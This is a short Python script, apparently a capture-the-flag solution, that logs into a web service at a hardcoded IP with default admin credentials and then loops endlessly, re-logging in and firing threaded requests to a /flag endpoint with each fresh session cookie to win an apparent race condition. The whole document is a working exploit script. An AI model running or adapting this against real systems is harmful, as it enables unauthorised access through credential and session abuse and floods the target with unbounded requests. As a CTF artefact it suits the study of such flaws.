import requests
import concurrent.futures

r = requests.post(
    "http://52.59.124.14:5010/",
    data={
        "username": "admin",
        "password": "admin",
    },
)
cookie = r.headers["Set-Cookie"].split(";")[0]
print(r.headers, cookie)

executor = concurrent.futures.ThreadPoolExecutor(max_workers=5)

def get_flag(cookie):
    r = requests.get(
        "http://52.59.124.14:5010/flag",
        headers={"Cookie": cookie},
    )
    if "ENO" in r.text:
        print(r.text)
    else:
        print("No flag")

while True:
    r = requests.post(
        "http://52.59.124.14:5010/",
        headers={"Cookie": cookie},
        data={
            "username": "admin",
            "password": "admin",
        },
    )
    cookie = r.headers["Set-Cookie"].split(";")[0]
    print(r.headers, cookie)
    executor.submit(get_flag, cookie)